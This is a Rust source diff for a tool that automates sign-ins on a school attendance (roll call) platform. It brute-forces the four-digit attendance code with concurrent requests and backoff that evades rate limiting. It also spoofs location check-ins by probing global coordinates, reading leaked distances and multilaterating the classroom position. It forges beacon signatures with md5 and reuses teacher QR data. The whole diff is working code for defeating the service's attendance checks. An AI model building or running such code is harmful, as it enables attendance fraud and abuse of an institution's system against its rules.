@@ -3,7 +3,7 @@
 //! with its own device id; shared computation (number code, radar solve) is done once by the caller.
 
 use crate::providers::Endpoints;
-use crate::radar::{self, Observation};
+use crate::radar::{self, GeoPoint, Observation};
 use reqwest::Client;
 use serde_json::{json, Value};
 
@@ -51,85 +51,190 @@ pub struct SignOutcome {
     pub discovered_code: Option<String>,
 }
 
-/// Whole-class attendance rate (percent) for the 15% gate — `GET /api/rollcall/{id}/answers`.
-pub async fn attendance_rate(client: &Client, ep: &Endpoints, id: &str) -> Option<f64> {
-    let v: Value = client.get(ep.answers(id)).send().await.ok()?.json().await.ok()?;
-    v.get("attendance_rate")
-        .and_then(Value::as_f64)
-        .or_else(|| v.pointer("/attendance/rate").and_then(Value::as_f64))
+// --- `student_rollcalls` object roster helpers (docs 30 real contract) ---
+
+/// A roster entry's status (any of the three real field names) is the present state `on_call_fine`.
+fn entry_fine(e: &Value) -> bool {
+    ["rollcall_status", "student_rollcall_status", "status"]
+        .iter()
+        .any(|k| e.get(*k).and_then(Value::as_str) == Some("on_call_fine"))
 }
 
-/// Read the shared number code once (`GET student_rollcalls`). None → caller brute-forces.
-pub async fn read_number_code(client: &Client, ep: &Endpoints, id: &str) -> Option<String> {
-    let v: Value = client.get(ep.student_rollcalls(id)).send().await.ok()?.json().await.ok()?;
-    v.get("number_code")
-        .and_then(|c| c.as_str().map(str::to_string))
-        .or_else(|| v.pointer("/0/number_code").and_then(|c| c.as_str().map(str::to_string)))
+/// The top-level rollcall status (`status` or `rollcallStatus`) is `on_call_fine`.
+fn top_fine(v: &Value) -> bool {
+    ["status", "rollcallStatus"]
+        .iter()
+        .any(|k| v.get(*k).and_then(Value::as_str) == Some("on_call_fine"))
 }
 
-/// Confirm the account is actually marked present (`on_call_fine`) — the rule after every sign.
-pub async fn recheck_on_call_fine(client: &Client, ep: &Endpoints, id: &str) -> bool {
-    let Ok(resp) = client.get(ep.student_rollcalls(id)).send().await else { return false };
-    let Ok(v) = resp.json::<Value>().await else { return false };
-    if let Some(b) = v.get("on_call_fine").and_then(Value::as_bool) {
-        return b;
+/// (present, total) over the `student_rollcalls` roster — present = entries in an `on_call_fine` state.
+fn roster_stats(v: &Value) -> (usize, usize) {
+    match v.get("student_rollcalls").and_then(Value::as_array) {
+        Some(a) => (a.iter().filter(|e| entry_fine(e)).count(), a.len()),
+        None => (0, 0),
     }
-    v.as_array()
-        .map(|a| a.iter().any(|e| e.get("on_call_fine").and_then(Value::as_bool) == Some(true)))
+}
+
+/// The caller's OWN roster entry (matched by `user_no`/`user_id`) is present.
+fn my_present(v: &Value, user_no: &str) -> bool {
+    if user_no.is_empty() {
+        return false;
+    }
+    v.get("student_rollcalls")
+        .and_then(Value::as_array)
+        .map(|a| {
+            a.iter().any(|e| {
+                let uid = e.get("user_no").or_else(|| e.get("user_id")).and_then(Value::as_str);
+                uid == Some(user_no) && entry_fine(e)
+            })
+        })
         .unwrap_or(false)
 }
 
-/// number: submit the code (shared) or brute-force it. Returns the code it used so it can be shared.
-/// `concurrency`/`cooldown_ms` tune the brute-force fallback (docs 30 tuning knobs).
+/// Whole-class attendance rate (percent) for the 15% gate — computed from the roster (docs 30).
+pub async fn attendance_rate(client: &Client, ep: &Endpoints, id: &str) -> Option<f64> {
+    let v: Value = client.get(ep.student_rollcalls(id)).send().await.ok()?.json().await.ok()?;
+    let (present, total) = roster_stats(&v);
+    (total > 0).then(|| present as f64 / total as f64 * 100.0)
+}
+
+/// Read the shared number code once from the roster. None → caller brute-forces.
+pub async fn read_number_code(client: &Client, ep: &Endpoints, id: &str) -> Option<String> {
+    let v: Value = client.get(ep.student_rollcalls(id)).send().await.ok()?.json().await.ok()?;
+    v.get("student_rollcalls")
+        .and_then(Value::as_array)?
+        .iter()
+        .find_map(|e| e.get("number_code").and_then(|c| c.as_str().map(str::to_string)))
+}
+
+/// Confirm the account is actually marked present after a sign (v1 `confirmed_present`). Confirmed iff
+/// **my_present** (the caller's own `user_no` entry is present), **or** the whole class is present
+/// (present==total), **or** the top-level status is present. NEVER "any entry" — that would mask the
+/// caller's own sign failure whenever a classmate is present. Empty `user_no` skips my_present.
+pub async fn recheck_on_call_fine(client: &Client, ep: &Endpoints, id: &str, user_no: &str) -> bool {
+    let Ok(resp) = client.get(ep.student_rollcalls(id)).send().await else { return false };
+    let Ok(v) = resp.json::<Value>().await else { return false };
+    let (present, total) = roster_stats(&v);
+    my_present(&v, user_no) || (total > 0 && present == total) || top_fine(&v)
+}
+
+/// Brute-force tuning (docs 30). Concurrency starts high and halves toward `min_concurrency` on
+/// throttling; `cooldown_ms` is the backoff sleep; give up after `max_cooldowns` transient rounds.
+#[derive(Clone, Copy)]
+pub struct NumberCfg {
+    pub concurrency: u32,
+    pub min_concurrency: u32,
+    pub cooldown_ms: u64,
+    pub max_cooldowns: u32,
+}
+
+/// Classification of a single number-answer response — the real server distinguishes these and the
+/// old code (recheck-only, 429-only) could neither stop on a fatal session nor tell wrong-vs-throttled.
+#[derive(Clone, Copy, PartialEq, Eq, Debug)]
+pub enum CodeResult {
+    Success,
+    Wrong,
+    Transient,
+    Fatal,
+}
+
+/// Classify a number-answer by HTTP status first, then the body for a 2xx (docs 30).
+pub fn classify_response(status: u16, body: &str) -> CodeResult {
+    if status == 401 || status == 403 || (300..400).contains(&status) {
+        return CodeResult::Fatal; // auth lost / redirect to login → aborting is the only safe move
+    }
+    if matches!(status, 408 | 425 | 429) || (500..600).contains(&status) {
+        return CodeResult::Transient; // throttled / server hiccup → cool down and retry
+    }
+    if matches!(status, 400 | 409 | 422) {
+        return CodeResult::Wrong; // this code is wrong, others may be right
+    }
+    if (200..300).contains(&status) {
+        let low = body.to_lowercase();
+        if low.contains("<form") && low.contains("login") {
+            return CodeResult::Fatal; // a 200 that is really the login page = session expired
+        }
+        if is_success_body(body) {
+            return CodeResult::Success;
+        }
+        return CodeResult::Wrong; // 2xx without a success flag → treat as a rejected code
+    }
+    CodeResult::Wrong
+}
+
+fn is_success_body(body: &str) -> bool {
+    let Ok(v) = serde_json::from_str::<Value>(body) else { return false };
+    ["success", "is_success", "ok"].iter().any(|k| v.get(*k).and_then(Value::as_bool) == Some(true))
+        || v.get("status").and_then(Value::as_str) == Some("success")
+}
+
+/// The token every sign type's auth-lost `Err` carries, so `is_auth_lost` recognises it (R4.1 #2).
+pub const SESSION_INVALID: &str = "session invalid";
+
+/// The URL half of the auth-lost decision: a final URL that landed on a login page (whole URL, lowercased
+/// — v1 `"login" in str(resp.url).lower()`). Shared by every sign type and the poll canary (single truth).
+pub fn response_url_is_login(url: &reqwest::Url) -> bool {
+    url.as_str().to_lowercase().contains("login")
+}
+
+/// Is this response a dead session? The status+body half (`classify_response == Fatal`) OR the url half.
+/// Used by radar/self_registration/number so ALL sign types recover a session lost mid-sign, not only number.
+pub fn response_auth_lost(status: u16, url: &reqwest::Url, body: &str) -> bool {
+    classify_response(status, body) == CodeResult::Fatal || response_url_is_login(url)
+}
+
+/// Does a sign error signal a lost session (→ re-login + re-sign)? Keyed on the shared `SESSION_INVALID`.
+pub fn is_auth_lost(err: &str) -> bool {
+    err.contains(SESSION_INVALID)
+}
+
+/// number: submit the shared code once (classified), or brute-force it. Success is the response
+/// success flag — not just a recheck (docs 30 §3). Returns the winning code so it can be shared.
 pub async fn sign_number(
     client: &Client,
     ep: &Endpoints,
     id: &str,
     device_id: &str,
     code: Option<&str>,
-    concurrency: u32,
-    cooldown_ms: u64,
+    cfg: NumberCfg,
 ) -> Result<SignOutcome, String> {
+    let url = ep.answer_number(id);
     if let Some(code) = code {
-        submit_number(client, ep, id, device_id, code).await?;
-        if recheck_on_call_fine(client, ep, id).await {
-            return Ok(SignOutcome { method: "number".into(), discovered_code: Some(code.to_string()) });
-        }
-        return Err("number submitted but on_call_fine not set".into());
+        return match submit_number_code(client, &url, device_id, code).await {
+            CodeResult::Success => Ok(SignOutcome { method: "number".into(), discovered_code: Some(code.to_string()) }),
+            CodeResult::Fatal => Err(format!("number: fatal response ({SESSION_INVALID})")),
+            CodeResult::Transient => Err("number: transient error submitting shared code".into()),
+            CodeResult::Wrong => Err("number: shared code rejected".into()),
+        };
     }
-    brute_force_number(client, ep, id, device_id, concurrency, cooldown_ms).await
+    brute_force_number(client, &url, device_id, cfg).await
 }
 
-async fn submit_number(client: &Client, ep: &Endpoints, id: &str, device_id: &str, code: &str) -> Result<(), String> {
-    client
-        .put(ep.answer_number(id))
-        .json(&json!({ "deviceId": device_id, "numberCode": code }))
-        .send()
-        .await
-        .map_err(|e| format!("number: {e}"))?;
-    Ok(())
+async fn submit_number_code(client: &Client, url: &str, device_id: &str, code: &str) -> CodeResult {
+    match client.put(url).json(&json!({ "deviceId": device_id, "numberCode": code })).send().await {
+        Err(_) => CodeResult::Transient, // transport error → treat as transient, cool down
+        Ok(resp) => {
+            let status = resp.status().as_u16();
+            let rurl = resp.url().clone();
+            let body = resp.text().await.unwrap_or_default();
+            let r = classify_response(status, &body);
+            // OR-in the url half so a redirect-to-login (2xx body) is Fatal too (shared auth-lost truth).
+            if r == CodeResult::Fatal || response_url_is_login(&rurl) { CodeResult::Fatal } else { r }
+        }
+    }
 }
 
-// ponytail: bounded 0000–9999, `concurrency` codes in flight per batch, exponential 429 backoff with
-// a configurable floor. `concurrency == 1` (default) is the sequential path with a reliable
-// `discovered_code` to share; widen only if a real tenant makes it too slow. `cooldown_ms` is the
-// backoff floor. A transport error on one code is swallowed (the sweep continues) — a rare fallback.
-async fn brute_force_number(
-    client: &Client,
-    ep: &Endpoints,
-    id: &str,
-    device_id: &str,
-    concurrency: u32,
-    cooldown_ms: u64,
-) -> Result<SignOutcome, String> {
-    let floor = cooldown_ms.max(1);
-    let width = concurrency.clamp(1, 64);
-    let mut delay_ms = 0u64;
+// ponytail: bounded 0000–9999 in batches of `width` (starts at `concurrency`≈100). Any Fatal aborts
+// the whole round immediately; any Success wins; a throttled batch halves `width` toward the min and
+// retries after a cooldown, giving up after `max_cooldowns`. Widen/tune via Settings if a real tenant
+// needs it.
+async fn brute_force_number(client: &Client, url: &str, device_id: &str, cfg: NumberCfg) -> Result<SignOutcome, String> {
+    let floor = cfg.cooldown_ms.max(1);
+    let min_w = cfg.min_concurrency.clamp(1, 256);
+    let mut width = cfg.concurrency.clamp(min_w, 256);
+    let mut cooldowns = 0u32;
     let mut n: u32 = 0;
     while n <= 9999 {
-        if delay_ms > 0 {
-            tokio::time::sleep(std::time::Duration::from_millis(delay_ms)).await;
-        }
         let batch_start = n;
         let mut set = tokio::task::JoinSet::new();
         for _ in 0..width {
@@ -138,38 +243,39 @@ async fn brute_force_number(
             }
             let code = format!("{n:04}");
             n += 1;
-            let (client, url, device_id) = (client.clone(), ep.answer_number(id), device_id.to_string());
+            let (client, url, device_id) = (client.clone(), url.to_string(), device_id.to_string());
             set.spawn(async move {
-                client
-                    .put(&url)
-                    .json(&json!({ "deviceId": device_id, "numberCode": code }))
-                    .send()
-                    .await
-                    .map(|r| r.status().as_u16())
-                    .unwrap_or(0) // transport error → treat as non-429, keep sweeping
+                let r = submit_number_code(&client, &url, &device_id, &code).await;
+                (code, r)
             });
         }
-        let mut throttled = false;
+        let (mut fatal, mut transient, mut success) = (false, false, None);
         while let Some(res) = set.join_next().await {
-            if matches!(res, Ok(429)) {
-                throttled = true;
+            if let Ok((code, r)) = res {
+                match r {
+                    CodeResult::Fatal => fatal = true,
+                    CodeResult::Success => success = Some(code),
+                    CodeResult::Transient => transient = true,
+                    CodeResult::Wrong => {}
+                }
             }
         }
-        if throttled {
-            delay_ms = (delay_ms * 2).clamp(floor, 5000); // back off, don't give up
+        if fatal {
+            return Err(format!("number: fatal response ({SESSION_INVALID} / login page) — aborting the round"));
+        }
+        if let Some(code) = success {
+            return Ok(SignOutcome { method: "number(brute)".into(), discovered_code: Some(code) });
+        }
+        if transient {
+            cooldowns += 1;
+            if cooldowns > cfg.max_cooldowns {
+                return Err("number: too many transient errors, giving up".into());
+            }
+            width = (width / 2).max(min_w); // adaptive: halve toward the floor concurrency
+            tokio::time::sleep(std::time::Duration::from_millis(floor)).await;
             n = batch_start; // retry the throttled batch
-            continue;
         }
-        delay_ms = 0;
-        if recheck_on_call_fine(client, ep, id).await {
-            // Only the sequential path can attribute the winning code to share it.
-            let (method, discovered) = if width == 1 {
-                ("number(brute)", Some(format!("{batch_start:04}")))
-            } else {
-                ("number(brute-parallel)", None)
-            };
-            return Ok(SignOutcome { method: method.into(), discovered_code: discovered });
-        }
+        // all wrong → n already advanced to the next batch
     }
     Err("number code not found in 0000–9999".into())
 }
@@ -182,23 +288,32 @@ pub async fn sign_radar(
     ep: &Endpoints,
     id: &str,
     strategies: &[String],
+    user_no: &str,
+    device_id: &str,
 ) -> Result<SignOutcome, String> {
     let mut last_err = String::from("radar: no strategy in chain succeeded");
     for strat in strategies {
         match strat.as_str() {
             "empty_answer" => {
-                client
+                // Empty main path (docs 30 / docs/70 §1): plain `{}`, no api_version, no beacon.
+                let resp = client
                     .put(ep.answer_radar(id))
                     .json(&json!({}))
                     .send()
                     .await
                     .map_err(|e| format!("radar: {e}"))?;
-                if recheck_on_call_fine(client, ep, id).await {
+                // Session lost mid-sign → abort with the shared marker so the monitor re-logins + re-signs.
+                let (status, rurl) = (resp.status().as_u16(), resp.url().clone());
+                let body = resp.text().await.unwrap_or_default();
+                if response_auth_lost(status, &rurl, &body) {
+                    return Err(format!("radar: {SESSION_INVALID}"));
+                }
+                if recheck_on_call_fine(client, ep, id, user_no).await {
                     return Ok(SignOutcome { method: "radar(empty)".into(), ..Default::default() });
                 }
                 last_err = "radar empty answer did not mark present".into();
             }
-            "global_wgs84" => match radar_multilaterate(client, ep, id).await {
+            "global_wgs84" => match radar_solve_and_sign(client, ep, id, user_no, device_id).await {
                 Ok(outcome) => return Ok(outcome),
                 Err(e) => last_err = e,
             },
@@ -208,64 +323,170 @@ pub async fn sign_radar(
     Err(last_err)
 }
 
-/// `global_wgs84`: probe a few spread coordinates, read the returned distance, solve on the WGS84
-/// ellipsoid (`radar::solve`), resubmit the solved point, and confirm.
-async fn radar_multilaterate(client: &Client, ep: &Endpoints, id: &str) -> Result<SignOutcome, String> {
-    let center = radar_center(client, ep, id).await.unwrap_or((25.0, 121.5));
-    let probes = spread(center);
-    let mut obs = Vec::new();
-    for (lat, lon) in probes {
-        if let Some(dist) = probe_distance(client, ep, id, lat, lon).await {
-            obs.push(Observation { lat, lon, dist_m: dist });
+/// `global_wgs84` = the docs/70 §11 driver (steps 1-5): `lite` (no coords) → probe the 12 earth-scale
+/// anchors → `solve_global_radar` → standard sampling rings → refined estimate. Any submit that lands
+/// in scope (HTTP 2xx, no error_code) is a hit → recheck → sign. ponytail: steps 6-7 (supplement
+/// rings / unbounded chessboard grid / rate-limit cooldown) + concurrent anchor probing are R2.5.
+async fn radar_solve_and_sign(client: &Client, ep: &Endpoints, id: &str, user_no: &str, device_id: &str) -> Result<SignOutcome, String> {
+    let (use_beacon, beacon_nonce) = radar_lite(client, ep, id).await;
+    let beacon = if use_beacon { Some((beacon_nonce.as_str(), user_no)) } else { None };
+
+    let mut obs: Vec<Observation> = Vec::new();
+    // (1) probe the 12 global anchors; a direct in-scope hit signs immediately.
+    for point in radar::global_anchor_points(12) {
+        match radar_probe(client, ep, id, point, device_id, beacon).await {
+            ProbeOutcome::InRange => return radar_confirm(client, ep, id, user_no).await,
+            ProbeOutcome::Distance(d) => obs.push(Observation { point, distance: d }),
+            ProbeOutcome::NoInfo => {}
         }
     }
-    let (tlat, tlon) = radar::solve(&obs).ok_or("radar: could not multilaterate")?;
-    client
-        .put(ep.answer_radar(id))
-        .json(&json!({ "lat": tlat, "lng": tlon }))
-        .send()
-        .await
-        .map_err(|e| format!("radar resubmit: {e}"))?;
-    if recheck_on_call_fine(client, ep, id).await {
-        Ok(SignOutcome { method: "radar(solved)".into(), ..Default::default() })
-    } else {
-        Err("radar solved but on_call_fine not set".into())
+    // (2) need ≥3 distances to solve.
+    if obs.len() < 3 {
+        return Err(format!("radar: only {} anchor distances (need ≥3)", obs.len()));
+    }
+    // (3) coarse global solve.
+    let est = radar::solve_global_radar(&obs, None).ok_or("radar: solver failed")?.point;
+    // (4) standard sampling rings around the estimate.
+    for point in radar::standard_sample_points(est) {
+        match radar_probe(client, ep, id, point, device_id, beacon).await {
+            ProbeOutcome::InRange => return radar_confirm(client, ep, id, user_no).await,
+            ProbeOutcome::Distance(d) => obs.push(Observation { point, distance: d }),
+            ProbeOutcome::NoInfo => {}
+        }
+    }
+    // (5) refine with the fuller observation set and submit the estimate itself.
+    let est2 = radar::solve_global_radar(&obs, Some(est)).ok_or("radar: refine failed")?.point;
+    match radar_probe(client, ep, id, est2, device_id, beacon).await {
+        ProbeOutcome::InRange => radar_confirm(client, ep, id, user_no).await,
+        _ => Err("radar: estimate not within scope (supplement/grid deferred to R2.5)".into()),
     }
 }
 
-async fn radar_center(client: &Client, ep: &Endpoints, id: &str) -> Option<(f64, f64)> {
-    let v: Value = client.get(ep.lite(id)).send().await.ok()?.json().await.ok()?;
-    Some((v.get("lat")?.as_f64()?, v.get("lng").or(v.get("lon"))?.as_f64()?))
+async fn radar_confirm(client: &Client, ep: &Endpoints, id: &str, user_no: &str) -> Result<SignOutcome, String> {
+    if recheck_on_call_fine(client, ep, id, user_no).await {
+        Ok(SignOutcome { method: "radar(solved)".into(), ..Default::default() })
+    } else {
+        Err("radar: hit but on_call_fine not set".into())
+    }
 }
 
-/// Four spread points ~200 m around a center — non-collinear so the solver is well-posed.
-fn spread((lat, lon): (f64, f64)) -> [(f64, f64); 4] {
-    let d = 0.002; // ~200 m
-    [(lat + d, lon), (lat - d, lon + d), (lat, lon - d), (lat + d, lon + d)]
+/// `lite` (docs/70 §1): carries NO target coordinate — only `use_beacon` + `beacon_nonce`.
+async fn radar_lite(client: &Client, ep: &Endpoints, id: &str) -> (bool, String) {
+    let v: Value = match client.get(ep.lite(id)).send().await {
+        Ok(r) => r.json().await.unwrap_or(Value::Null),
+        Err(_) => Value::Null,
+    };
+    (
+        v.get("use_beacon").and_then(Value::as_bool).unwrap_or(false),
+        v.get("beacon_nonce").and_then(Value::as_str).unwrap_or("").to_string(),
+    )
 }
 
-async fn probe_distance(client: &Client, ep: &Endpoints, id: &str, lat: f64, lon: f64) -> Option<f64> {
-    let v: Value = client
-        .put(ep.answer_radar(id))
-        .json(&json!({ "lat": lat, "lng": lon }))
-        .send()
-        .await
-        .ok()?
-        .json()
-        .await
-        .ok()?;
-    v.get("distance").and_then(Value::as_f64)
+enum ProbeOutcome {
+    InRange,
+    Distance(f64),
+    NoInfo,
+}
+
+/// Submit one coordinate answer (docs/70 §1 body) and classify the response.
+async fn radar_probe(client: &Client, ep: &Endpoints, id: &str, point: GeoPoint, device_id: &str, beacon: Option<(&str, &str)>) -> ProbeOutcome {
+    let mut body = json!({
+        "deviceId": device_id, "latitude": point.lat, "longitude": point.lon,
+        "accuracy": 60, "speed": null, "heading": null, "altitude": 0, "altitudeAccuracy": null
+    });
+    if let Some((nonce, uid)) = beacon {
+        body["radarSignal"] = Value::String(radar_signature(nonce, device_id, uid, now_unix()));
+    }
+    let resp = match client.put(ep.answer_radar_coord(id)).json(&body).send().await {
+        Ok(r) => r,
+        Err(_) => return ProbeOutcome::NoInfo,
+    };
+    let status = resp.status().as_u16();
+    let text = resp.text().await.unwrap_or_default();
+    parse_scope(status, &text)
+}
+
+/// docs/70 §1 distance extraction — **error_code first, regardless of status** (a real server returns
+/// out-of-scope as `200 + error_code`; a status-first check would misread every off-target anchor as
+/// in-range → no distances → the solver never runs → radar fully dead; exact status is a §12 unknown).
+fn parse_scope(status: u16, body: &str) -> ProbeOutcome {
+    let v: Value = serde_json::from_str(body.trim()).unwrap_or(Value::Null);
+    if has_scope_error(&v) {
+        return match extract_distance(&v) {
+            Some(d) if d >= 0.0 => ProbeOutcome::Distance(d),
+            _ => ProbeOutcome::NoInfo, // scope error but no usable distance
+        };
+    }
+    if (200..300).contains(&status) {
+        return ProbeOutcome::InRange; // in scope → hit
+    }
+    ProbeOutcome::NoInfo
+}
+
+/// Nested walk (docs/70 §1): body; if dict, descend keys `data,result,error,errors,scope,rollcall`;
+/// if list, first 3 elements. Collect the dicts to inspect (bounded depth).
+fn walk_dicts<'a>(v: &'a Value, out: &mut Vec<&'a serde_json::Map<String, Value>>, depth: u32) {
+    if depth > 6 {
+        return;
+    }
+    match v {
+        Value::Object(m) => {
+            out.push(m);
+            for key in ["data", "result", "error", "errors", "scope", "rollcall"] {
+                if let Some(child) = m.get(key) {
+                    walk_dicts(child, out, depth + 1);
+                }
+            }
+        }
+        Value::Array(a) => a.iter().take(3).for_each(|item| walk_dicts(item, out, depth + 1)),
+        _ => {}
+    }
+}
+fn has_scope_error(v: &Value) -> bool {
+    let mut dicts = Vec::new();
+    walk_dicts(v, &mut dicts, 0);
+    dicts.iter().any(|m| m.get("error_code").and_then(Value::as_str) == Some("radar_out_of_rollcall_scope"))
+}
+fn extract_distance(v: &Value) -> Option<f64> {
+    let mut dicts = Vec::new();
+    walk_dicts(v, &mut dicts, 0);
+    for m in dicts {
+        for key in ["distance", "scope_distance", "distance_meters", "distanceMeters"] {
+            if let Some(d) = m.get(key).and_then(Value::as_f64) {
+                return Some(d);
+            }
+        }
+    }
+    None
+}
+
+/// beacon signature (docs/70 §1): `md5(nonce+deviceId+userId+ts) + "," + ts`. ts = unix seconds.
+fn radar_signature(nonce: &str, device_id: &str, user_no: &str, ts: u64) -> String {
+    use md5::{Digest, Md5};
+    let mut h = Md5::new();
+    h.update(format!("{nonce}{device_id}{user_no}{ts}"));
+    let hex: String = h.finalize().iter().map(|b| format!("{b:02x}")).collect();
+    format!("{hex},{ts}")
+}
+
+fn now_unix() -> u64 {
+    std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).map(|d| d.as_secs()).unwrap_or(0)
 }
 
 /// self_registration: empty body, the simplest type.
-pub async fn sign_self_registration(client: &Client, ep: &Endpoints, id: &str) -> Result<SignOutcome, String> {
-    client
+pub async fn sign_self_registration(client: &Client, ep: &Endpoints, id: &str, user_no: &str) -> Result<SignOutcome, String> {
+    let resp = client
         .put(ep.answer_self_registration(id))
         .json(&json!({}))
         .send()
         .await
         .map_err(|e| format!("self_registration: {e}"))?;
-    if recheck_on_call_fine(client, ep, id).await {
+    let (status, rurl) = (resp.status().as_u16(), resp.url().clone());
+    let body = resp.text().await.unwrap_or_default();
+    if response_auth_lost(status, &rurl, &body) {
+        return Err(format!("self_registration: {SESSION_INVALID}"));
+    }
+    if recheck_on_call_fine(client, ep, id, user_no).await {
         Ok(SignOutcome { method: "self_registration".into(), ..Default::default() })
     } else {
         Err("self_registration submitted but on_call_fine not set".into())
@@ -281,6 +502,7 @@ pub async fn sign_qr_with_teacher_data(
     student_rollcall_id: &str,
     device_id: &str,
     data: &str,
+    user_no: &str,
 ) -> Result<SignOutcome, String> {
     student
         .put(ep.answer_qr(student_rollcall_id))
@@ -288,7 +510,7 @@ pub async fn sign_qr_with_teacher_data(
         .send()
         .await
         .map_err(|e| format!("qr: {e}"))?;
-    if recheck_on_call_fine(student, ep, student_rollcall_id).await {
+    if recheck_on_call_fine(student, ep, student_rollcall_id, user_no).await {
         Ok(SignOutcome { method: "qr(teacher-assist)".into(), ..Default::default() })
     } else {
         Err("qr submitted but on_call_fine not set".into())
